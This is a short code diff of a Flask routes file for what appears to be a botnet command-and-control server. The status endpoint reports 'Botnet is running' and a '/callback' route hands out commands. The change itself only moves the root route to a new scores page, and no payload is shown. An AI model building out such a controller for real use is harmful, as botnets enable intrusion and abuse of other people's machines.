@@ -7,10 +7,15 @@ TODO: Implement these functions
 from flask import request, render_template, jsonify
 from . import app
 
-@app.route("/")
 @app.route("/status")
 def status():
     return jsonify({"status": "Botnet is running"})
+
+@app.route('/')
+def scores():
+    state = app.config["state"]
+    return render_template("index.html", state=state.state)
+
 
 @app.route("/callback", methods=["GET", 'PUT'])
 def get_commands():
